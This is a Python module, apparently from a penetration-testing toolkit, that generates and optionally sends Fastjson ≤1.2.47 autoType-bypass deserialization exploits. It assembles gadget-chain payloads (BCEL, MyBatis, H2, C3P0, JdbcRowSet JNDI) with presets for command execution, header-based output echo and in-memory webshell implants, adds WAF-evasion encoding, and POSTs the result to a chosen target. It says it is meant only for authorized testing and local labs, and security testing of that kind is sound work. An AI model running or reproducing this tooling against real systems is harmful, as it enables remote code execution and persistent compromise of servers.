"""Fastjson ≤1.2.47 证明 PoC：生成 payload，可选 POST 到授权目标。"""

from __future__ import annotations

import base64
from typing import Optional

import httpx

from fastjson_toolkit.poc.bytecode import (
    BytecodePresetOptions,
    default_proof_content,
    default_proof_path,
    normalize_preset_choice,
    normalize_preset_kind,
    resolve_bytecode_payload,
)
from fastjson_toolkit.poc.echo import (
    normalize_engine,
    supports_bytecode_echo,
)
from fastjson_toolkit.poc.memshell import supports_1247_memshell
from fastjson_toolkit.poc.v1_2_47.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_47.models import (
    Poc1247GenerateOptions,
    Poc1247GenerateResult,
    Poc1247SendOptions,
    Poc1247SendResult,
)
from fastjson_toolkit.poc.getter import notes_for_trigger, normalize_getter_trigger
from fastjson_toolkit.poc.v1_2_47.payloads import build_payload
from fastjson_toolkit.waf import apply_waf_payload

COMMON_NOTES = [
    "原理：@type=java.lang.Class → MiscCodec → TypeUtils.loadClass 写入 mappings；"
    "随后 checkAutoType 优先命中缓存，绕过黑名单（≤1.2.47；1.2.48 起默认不缓存）。",
    "仅用于授权测试 / 本地靶场。完整 gadget 靶场：http://127.0.0.1:18247/api/fastjson",
    "BCEL 需 jdk≤8u251 且存在对应 dbcp/mybatis；JdbcRowSet 需可出网 JNDI；"
    "H2/C3P0 需 classpath 含对应依赖。",
    "getter：无期望类可用 $ref / JSONObject 作 key；有期望类需套 Currency"
    "（见 getter_trigger）。",
    "内存马：BCEL/H2/MyBatis 链（不含 jdbc_rowset）；preset=memshell；默认内置 jar 生成。",
    "预设字节码：auto/custom/touch/exec/echo/memshell（off→custom）；"
    "未提供 class_b64/bcel/serialized 时 auto 默认生成 exec 类（cmd）。",
]

_BYTECODE_GADGETS = frozenset(
    {
        "bcel_tomcat_dbcp",
        "bcel_tomcat_dbcp2",
        "bcel_commons_dbcp",
        "bcel_commons_dbcp2",
        "mybatis_bcel",
        "h2_jdbc",
    }
)


def _missing_user_payload(gadget: str, opts: Poc1247GenerateOptions) -> bool:
    if gadget in _BYTECODE_GADGETS:
        if gadget == "h2_jdbc":
            return not (
                (opts.class_b64 and opts.class_b64.strip())
                or (opts.h2_url and opts.h2_url.strip())
            )
        return not (
            (opts.bcel_code and opts.bcel_code.strip())
            or (opts.class_b64 and opts.class_b64.strip())
        )
    if gadget == "c3p0_wrapper":
        return not (
            (opts.user_overrides and opts.user_overrides.strip())
            or (opts.serialized_b64 and opts.serialized_b64.strip())
        )
    return False


def _decode_echo_output(headers: dict[str, str], body: str) -> Optional[str]:
    lower = {str(k).lower(): v for k, v in headers.items()}
    b64 = lower.get("x-echo")
    if b64:
        try:
            return base64.b64decode(b64).decode("utf-8", errors="replace")
        except Exception:  # noqa: BLE001
            pass
    # body 回显兜底：排除常见业务短响应
    text = (body or "").strip()
    if text and text.lower() not in {"success", "ok", "true", "false"}:
        if "Internal Server Error" not in text and len(text) < 20000:
            if lower.get("x-echo-cmd") or lower.get("x-echo-engine"):
                return text
    return None


def generate_poc_1247(
    options: Optional[Poc1247GenerateOptions] = None,
) -> Poc1247GenerateResult:
    opts = options or Poc1247GenerateOptions()
    entry = get_gadget(opts.gadget)
    trigger = normalize_getter_trigger(opts.getter_trigger)

    class_b64 = opts.class_b64
    bcel_code = opts.bcel_code
    user_overrides = opts.user_overrides
    serialized_b64 = opts.serialized_b64
    choice = normalize_preset_choice(
        opts.preset, echo=bool(opts.echo), memshell=bool(opts.memshell)
    )
    needs = entry.id in _BYTECODE_GADGETS or entry.id == "c3p0_wrapper"
    missing = _missing_user_payload(entry.id, opts) if needs else True
    # jdbc_rowset + echo：仍走 resolve（产物供托管，不写入 BCEL 链）
    jdbc_echo = entry.id == "jdbc_rowset" and (
        choice == "echo" or bool(opts.echo)
    )
    resolved_kind = normalize_preset_kind(
        choice,
        echo=bool(opts.echo),
        memshell=bool(opts.memshell),
        missing_user_payload=missing,
    )
    memshell_on = resolved_kind == "memshell"
    echo_on = resolved_kind == "echo"
    engine = ""
    cmd_header = ""
    preset_used = ""
    echo_bcel: Optional[str] = None
    echo_b64: Optional[str] = None
    memshell_info: Optional[dict] = None
    memshell_connect: Optional[str] = None
    notes = list(COMMON_NOTES)

    should_resolve = False
    if memshell_on:
        if not supports_1247_memshell(entry.id):
            raise ValueError(
                f"gadget={entry.id} 不支持内存马；"
                "请选用 BCEL / MyBatis / H2（不含 jdbc_rowset）"
            )
        should_resolve = True
    elif echo_on:
        if not supports_bytecode_echo(entry.id) and not jdbc_echo:
            raise ValueError(
                f"gadget={entry.id} 不支持自动回显类生成；"
                "请选用 BCEL / MyBatis / H2，或自备 class_b64"
            )
        should_resolve = True
    elif needs and resolved_kind in ("touch", "exec", "custom"):
        should_resolve = True
    elif needs and resolved_kind is None:
        should_resolve = False

    if should_resolve:
        if opts.echo or opts.preset == "echo":
            if memshell_on:
                notes.append("preset=memshell 优先于 echo")
        proof_path = opts.proof_path or default_proof_path(entry.id)
        proof_content = opts.proof_content or default_proof_content(entry.id)
        engine = normalize_engine(opts.engine) if echo_on else ""
        cmd_header = (
            ((opts.cmd_header or "X-Cmd").strip() or "X-Cmd") if echo_on else ""
        )
        art = resolve_bytecode_payload(
            BytecodePresetOptions(
                preset=choice,
                echo=bool(opts.echo),
                memshell=bool(opts.memshell),
                cmd=opts.cmd or "id",
                proof_path=proof_path,
                proof_content=proof_content,
                for_c3p0=entry.id == "c3p0_wrapper"
                and resolved_kind in ("touch", "exec", "custom"),
                class_b64=opts.class_b64,
                bcel_code=opts.bcel_code,
                serialized_b64=opts.serialized_b64,
                h2_url=opts.h2_url,
                user_overrides=opts.user_overrides,
                engine=engine or opts.engine,
                cmd_header=cmd_header or opts.cmd_header,
                ms_api=opts.ms_api,
                ms_server=opts.ms_server,
                ms_tool=opts.ms_tool,
                ms_type=opts.ms_type,
                ms_path=opts.ms_path,
                ms_jdk=opts.ms_jdk,
                ms_static_initialize=True,
                missing_user_payload=missing,
            )
        )
        if art is None:
            raise RuntimeError("resolve_bytecode_payload 返回空")
        preset_used = art.kind
        notes.extend(art.notes)
        if art.kind == "memshell":
            class_b64 = art.class_b64
            bcel_code = None if entry.id == "h2_jdbc" else (art.bcel_code or None)
            echo_b64 = class_b64
            echo_bcel = bcel_code
            memshell_info = art.memshell_info
            memshell_connect = art.memshell_connect
            delivery = (art.meta or {}).get("delivery")
            if delivery is not None and getattr(delivery, "notes", None):
                notes.extend(delivery.notes)
            if memshell_connect:
                notes.append("连接信息：\n" + memshell_connect)
        elif art.kind == "echo":
            engine = art.engine or engine
            cmd_header = art.cmd_header or cmd_header
            echo_b64 = art.class_b64
            echo_bcel = art.bcel_code
            if supports_bytecode_echo(entry.id):
                class_b64 = art.class_b64
                bcel_code = None if entry.id == "h2_jdbc" else art.bcel_code
                notes.append(
                    f"已生成回显类 {art.class_name}：engine={engine}，"
                    f"请求头 {cmd_header}: {opts.cmd or 'id'}；"
                    "响应头 X-Echo(Base64) / X-Echo-Engine / body 可见输出。"
                )
            else:
                notes.append(
                    "JdbcRowSet 回显类已生成（class_b64/bcel_code），"
                    "请放到 JNDI/HTTP 可达处；JSON 链本身仍指向 jndi_url。"
                )
                notes.append(
                    f"回显触发：engine={engine}，Header {cmd_header}={opts.cmd or 'id'}"
                )
        elif entry.id == "c3p0_wrapper":
            serialized_b64 = art.serialized_b64 or serialized_b64
            user_overrides = None if art.serialized_b64 else user_overrides
            echo_b64 = art.class_b64 or echo_b64
            notes.append(
                f"已生成 C3P0 预设：kind={art.kind}；证明文件 {proof_path}"
            )
        else:
            class_b64 = art.class_b64 or class_b64
            bcel_code = None if entry.id == "h2_jdbc" else (art.bcel_code or bcel_code)
            echo_b64 = class_b64
            echo_bcel = bcel_code
            notes.append(
                f"已生成预设类 {art.class_name}：kind={art.kind}；"
                f"证明文件 {art.proof_path or proof_path}"
            )

    raw = build_payload(
        entry.id,
        jndi_url=opts.jndi_url,
        bcel_code=bcel_code,
        class_b64=class_b64,
        user_overrides=user_overrides,
        serialized_b64=serialized_b64,
        h2_url=opts.h2_url,
        getter_trigger=trigger,
        currency_field=opts.currency_field,
        json_key_with_type=opts.json_key_with_type,
        json_key_as_array=opts.json_key_as_array,
    )
    payload, waf_techs, waf_notes = apply_waf_payload(
        raw, opts.waf_techniques, opts.waf_options
    )
    notes.append(entry.description)
    notes.extend(notes_for_trigger(trigger))
    notes.extend(waf_notes)
    return Poc1247GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=payload,
        payload_raw=raw if waf_techs else None,
        getter_trigger=trigger,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
        echo=echo_on,
        engine=engine,
        cmd_header=cmd_header,
        preset=preset_used,
        class_b64=echo_b64 or class_b64,
        bcel_code=echo_bcel or bcel_code,
        memshell=memshell_on,
        memshell_info=memshell_info,
        memshell_connect=memshell_connect,
    )


def run_poc_1247(
    options: Optional[Poc1247SendOptions] = None,
) -> Poc1247SendResult:
    opts = options or Poc1247SendOptions()
    gen = generate_poc_1247(opts)
    summary = f"已生成 {gen.title} payload（未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    if gen.preset:
        summary += f"；preset={gen.preset}"
    if gen.echo:
        summary += f"；echo={gen.engine} header={gen.cmd_header}"
    if gen.memshell:
        summary += "；memshell=on"
    result = Poc1247SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        getter_trigger=gen.getter_trigger,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
        echo=gen.echo,
        engine=gen.engine,
        cmd_header=gen.cmd_header,
        preset=gen.preset,
        class_b64=gen.class_b64,
        bcel_code=gen.bcel_code,
        memshell=gen.memshell,
        memshell_info=gen.memshell_info,
        memshell_connect=gen.memshell_connect,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    if gen.echo and gen.cmd_header:
        headers.setdefault(gen.cmd_header, opts.cmd or "id")
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            resp = client.post(target, content=gen.payload.encode("utf-8"), headers=headers)
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc)}
        return result

    preview = (resp.text or "")[:2000]
    resp_headers = {str(k): str(v) for k, v in resp.headers.items()}
    echo_out = _decode_echo_output(resp_headers, resp.text or "")
    result.sent = True
    result.status_code = resp.status_code
    result.response_preview = preview
    result.echo_output = echo_out
    result.raw = {
        "status_code": resp.status_code,
        "headers": resp_headers,
    }
    result.ok = True
    if echo_out:
        result.summary = (
            f"已 POST {gen.title} → HTTP {resp.status_code}；回显成功"
            f"（engine={resp_headers.get('X-Echo-Engine') or resp_headers.get('x-echo-engine') or gen.engine}）"
        )
    else:
        result.summary = (
            f"已 POST {gen.title} → HTTP {resp.status_code}"
            "（请结合 DNSLog / 依赖 / 回显头确认）"
        )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1247",
    "list_gadgets",
    "run_poc_1247",
]
